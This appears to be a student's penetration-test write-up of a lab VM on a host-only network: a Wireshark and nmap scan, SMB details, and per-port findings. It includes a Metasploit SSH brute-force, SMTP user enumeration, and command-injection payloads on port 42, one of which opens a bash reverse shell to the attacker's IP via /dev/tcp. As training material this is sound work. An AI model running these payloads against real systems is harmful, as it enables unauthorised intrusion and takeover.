# aim
Hack a remote machine without having any idea about it 

# Methodology

0) Determine the ip address of the remote machine : using sniffing with wireshark on the suitable network (host-only network in my case)

1) Scan all the ports of the remote machine : to penetrate a system, there should be an open port otherwise It will be difficult to penetrate.

* nmap -sC -sV ip_address (in my case 192.168.123.6)


2) We determine all the informations about the target machine: uses linux OS 

smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.7-Ubuntu)
|   Computer name: lambda-config-1
|   NetBIOS computer name: LAMBDA-CONFIG-1\x00
|   Domain name: \x00
|   FQDN: lambda-config-1
|_  System time: 2021-05-14T12:56:16+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


3) Determine all the vulnerabilities existing : 

* port 7 : running echo service: not vulnerable 

* port 13 : running time service : not vulnerable

* port 22 : running ssh service : a bit vulnerable

Exploit used : used _msfconsole_ and runned the exploit _auxiliary/scanner/ssh/ssh_login# which is a brute force exploit. It tries all the combinaisons of _usr.txt_ and _password.txt_ in the folder 

* port 42 : running a vulnerable service : Enter a username to see the users last login time: 

Exploit used :	1)"; /bin/sh ; " to run a shell on the tcp connection
	        2) "; /bin/bash -i > /dev/tcp/192.168.123.3/9999  0<&1 ;" to run a reverse shell on the attacker machine on port 9999, port on which the attacker must be listening
	        
* port 25 : running smtp service of version _Postfix smtpd_ : vulnerable

Exploit used : used _msfconsole_ and runned the exploit _auxiliary/scanner /smtp/smtp_enum_ to enumerate the users of the target machine 
and found all the users on the target machine. The users are recorded in _target_users.txt_ file

* port 139 : running netbios-ssn : not vulnerable

but exploit tried : used _msfconsole_ and runned the exploit _exploit/multi/samba/usermap_script_ but It is not vulnerable

# ENJOY
	           
